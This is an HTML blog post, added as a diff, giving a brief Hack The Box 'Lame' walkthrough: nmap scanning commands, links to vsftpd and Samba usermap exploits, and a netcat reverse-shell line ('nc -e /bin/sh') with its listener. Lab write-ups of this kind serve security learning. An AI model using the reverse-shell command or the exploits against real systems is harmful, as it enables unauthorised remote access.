@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - Lame" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>Lame - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/lame/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="Lame" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/lame/" />
+	<meta property="og:description" content="Hack The Box - Lame" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/lame.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-06-06T08:00:00-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="Lame" />
+	<meta name="twitter:description" content="Hack The Box - Lame" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/lame.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/lame/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/lame/",
+	"url": "https://shengtuo.me/blog/htb/lame/",
+	"headline": "Lame",
+	"description": "Hack The Box - Lame",
+	"datePublished": "2025-06-06T08:00:00-07:00",
+	"dateModified": "2025-06-06T08:00:00-07:00",
+	"image": "https://shengtuo.me/cards/blog/htb/lame.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#exploits">Exploits</a>
+  <a href="#reference">Reference</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>Lame</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-06-06">Jun 6, 2025</time> · 1 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>Lame (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/lame">https://www.hackthebox.com/machines/lame</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/Lame/NOTES.md">https://github.com/h1994st/HTB/blob/main/Lame/NOTES.md</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -n -e utun6 -sS -sV --top-ports</span><span class="z-10"> 1000</span><span> $ipaddr</span></span>
+<span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A</span><span> $ipaddr</span></span></code></pre>
+<ul>
+<li><code>-vv</code>: verbose</li>
+<li><code>-n</code>: no DNS resolution</li>
+<li><code>-e</code>: choose the correct network interface</li>
+<li><code>-sS</code>: TCP SYN scan</li>
+<li><code>-sC</code>: script scan</li>
+<li><code>-sV</code>: service version detection</li>
+<li><code>--top-ports</code>: specify top N ports</li>
+<li><code>-T4</code>: timing template (higher is faster)</li>
+<li><code>-A</code>: aggressive scan options. Enable OS detection, version detection, script scanning, and traceroute</li>
+</ul>
+<h2 id="exploits"><a class="zola-anchor" href="#exploits" aria-label="Link to this section">#</a>
+Exploits</h2>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://www.exploit-db.com/exploits/49757">vsftpd 2.3.4 - Backdoor Command Execution</a>
+<ul>
+<li>This exploit successes, but external connections cannot be established due to some firewall configurations</li>
+</ul>
+</li>
+<li><a rel="noopener external" target="_blank" href="https://www.exploit-db.com/exploits/16320">Samba 3.0.20 usermap</a>
+<ul>
+<li>This exploit can run arbitrary commands that are specified in the SMB username</li>
+<li>We can utilize this exploit to establish a reverse shell, such as <code>nc -e /bin/sh $myip $myport</code></li>
+<li>On my local machine, running <code>nc -nlvp $myport</code> can interact with the remote machine</li>
+</ul>
+</li>
+</ul>
+<h2 id="reference"><a class="zola-anchor" href="#reference" aria-label="Link to this section">#</a>
+Reference</h2>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://0xdf.gitlab.io/2020/04/07/htb-lame.html">HTB: Lame | 0xdf hacks stuff</a></li>
+</ul>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/htb/cap/">Newer: Cap →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
